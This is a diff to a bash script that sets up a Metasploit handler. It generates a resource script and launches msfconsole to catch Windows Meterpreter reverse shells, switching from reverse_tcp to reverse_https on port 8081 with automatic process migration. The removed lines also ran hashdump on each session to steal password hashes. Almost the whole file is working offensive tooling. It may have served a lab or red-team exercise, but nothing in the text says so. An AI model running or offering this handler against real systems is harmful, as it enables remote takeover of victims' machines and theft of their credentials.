@@ -7,25 +7,27 @@ Color_Off='\033[0m'     # Text Reset
 
 tput civis
 
-while [ ! -f .attack ];do
+while [ ! -f .attack ]; do
     clear
-    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Meterpreter Shell...${Color_Off}\n"
+    echo -e "${LBlue}[${BBlue}+${LBlue}] ${BWhite}Setting up Reverse Shell...${Color_Off}\n"
     sleep 5
 done
 
 tput cnorm
-# Create /root/autoruncommands.rc with the specified commands to auto pwn!
-cat <<EOL > /root/autoruncommands.rc
-run post/windows/manage/migrate
-run post/windows/gather/hashdump
-EOL
 
-# Run Metasploit with the desired settings
-msfconsole -q -x "use exploit/multi/handler; \
-                  set PAYLOAD windows/meterpreter/reverse_tcp; \
-                  set LHOST $(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'); \
-                  set LPORT 5040; \
-                  set ExitOnSession false; \
-                  set AutoRunScript /root/autoruncommands.rc; \
-                  set VERBOSE true; \
-                  exploit"
+# Get the local IP address
+LHOST=$(ip route get 1 | awk '{print $7; exit}')
+
+# Generate the Metasploit resource script
+cat <<EOF > msf_handler.rc
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST $LHOST
+set LPORT 8081
+set AutoRunScript post/windows/manage/migrate
+set VERBOSE true
+run
+EOF
+
+# Run Metasploit with the generated resource script
+msfconsole -r msf_handler.rc
